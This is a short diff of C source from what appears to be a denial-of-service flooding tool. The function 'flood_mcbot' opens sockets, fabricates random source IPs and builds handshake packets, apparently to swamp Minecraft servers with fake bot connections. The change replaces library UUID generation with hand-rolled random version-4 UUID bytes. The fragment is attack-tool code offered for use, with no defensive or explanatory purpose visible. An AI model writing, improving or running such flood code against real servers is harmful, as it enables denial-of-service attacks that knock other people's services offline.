@@ -318,11 +318,15 @@ void flood_mcbot(layer4_args_t *args) {
         if (s < 0) continue;
         char fake_ip[32];
         rand_ipv4(fake_ip, sizeof(fake_ip));
-        uuid_t uuid; uuid_generate(uuid);
-        char uuid_str[37]; uuid_unparse_lower(uuid, uuid_str);
+        
+        uint8_t uuid_bytes[16];
+        rand_bytes(uuid_bytes, 16);
+        uuid_bytes[6] = (uuid_bytes[6] & 0x0f) | 0x40; /* Version 4 */
+        uuid_bytes[8] = (uuid_bytes[8] & 0x3f) | 0x80; /* Variant 1 */
+        
         char uuid_hex[33];
         int hp = 0;
-        for (int i = 0; i < 16; i++) hp += sprintf(uuid_hex + hp, "%02x", uuid[i]);
+        for (int i = 0; i < 16; i++) hp += sprintf(uuid_hex + hp, "%02x", uuid_bytes[i]);
         uuid_hex[32] = 0;
 
         uint8_t hs[2048];
